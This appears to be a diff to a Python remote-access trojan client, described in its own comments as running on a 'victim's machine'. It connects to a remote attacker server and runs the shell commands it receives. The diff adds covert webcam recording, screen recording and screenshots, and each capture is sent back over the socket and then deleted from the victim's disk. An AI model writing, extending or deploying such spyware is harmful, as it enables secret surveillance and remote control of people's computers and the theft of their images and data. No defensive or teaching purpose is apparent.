@@ -11,34 +11,51 @@ import sys  # helps us to execute terminal commands
 import pyautogui
 import numpy as np 
 import cv2
+import pyscreenshot as ImageGrab
 
-
-
+# to record screen
 def capture_screen():
 	SCREEN_SIZE=pyautogui.size()
 
 	fourcc=cv2.VideoWriter_fourcc(*'XVID')  # video codec library to write video file
 
 	out=cv2.VideoWriter("output.avi",fourcc,20.0,SCREEN_SIZE)
-
-	for i in range(40):
+	for i in range(120):
 
 		img=pyautogui.screenshot()
 		frame=np.array(img)
 
 		frame=cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
-
 		out.write(frame)
 
+
+	out.release()
+	cv2.destroyAllWindows()
+
+# to record webcam feed
+def capture_webcam():
+	vid=cv2.VideoCapture(0,cv2.CAP_DSHOW)  # to remove warning changing backend to CAP_DSHOW
+	fourcc=cv2.VideoWriter_fourcc(*'XVID')  # video codec library to write video file
+	width = int(vid.get(cv2.CAP_PROP_FRAME_WIDTH))
+	height = int(vid.get(cv2.CAP_PROP_FRAME_HEIGHT))
+	out=cv2.VideoWriter("webcam.avi",fourcc,20.0,(width,height))
+
+	for i in range(120):
+		ret,frame=vid.read()
+		if ret == True:
+			frame=cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
+			out.write(frame)
+	vid.release()
 	out.release()
 	cv2.destroyAllWindows()
 
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
 
-host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
-port=35135  # it will store port number on which server is listening
-
+#host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
+#port=35135  # it will store port number on which server is listening
+host="192.168.29.157"
+port=5050
 
 s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
 					   # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
@@ -48,6 +65,29 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 	try:
 		data=s.recv(20480) # recieving data in form of bytes from server(1024 B chunk)
 	
+
+		if data[:].decode() == "webcam":
+			s.send("capturing_webcam".encode())
+
+			capture_webcam()
+			f=open("webcam.avi","rb")
+			data=f.read()
+
+			l=len(data)
+			print(l)
+			s.send(str(l).encode())
+
+			response=s.recv(20480)
+			s.send(data)
+			fin = s.recv(1024)
+
+			f.close()
+			os.remove("webcam.avi")
+
+			response=os.getcwd()+"> "
+			s.send(response.encode())
+			continue			
+
 		if data[:].decode() == "rec":
 			s.send("capturing".encode())
 
@@ -60,10 +100,32 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 
 			response=s.recv(20480)
 			s.send(data)
-			fin = s.recv(1000)
+			fin = s.recv(1024)
 
 			f.close()
 			os.remove("output.avi")
+
+			response=os.getcwd()+"> "
+			s.send(response.encode())
+			continue
+
+
+		if data[:].decode() == "ss":
+			s.send("clicking".encode())
+			im=ImageGrab.grab()
+			im.save("screenshot.jpg")
+			f=open("screenshot.jpg","rb")
+			data=f.read()
+
+			l=len(data)
+			s.send(str(l).encode())
+
+			response=s.recv(20480)
+			s.send(data)
+			fin=s.recv(1024)
+
+			f.close()
+			os.remove("screenshot.jpg")
 
 			response=os.getcwd()+"> "
 			s.send(response.encode())
@@ -96,6 +158,7 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 	             
 			cmd.terminate()                      # terminating child process after each command
 	except Exception as e:
+		print(e)
 		print("Connection has been closed by server!!!")
 		s.close()
 		break
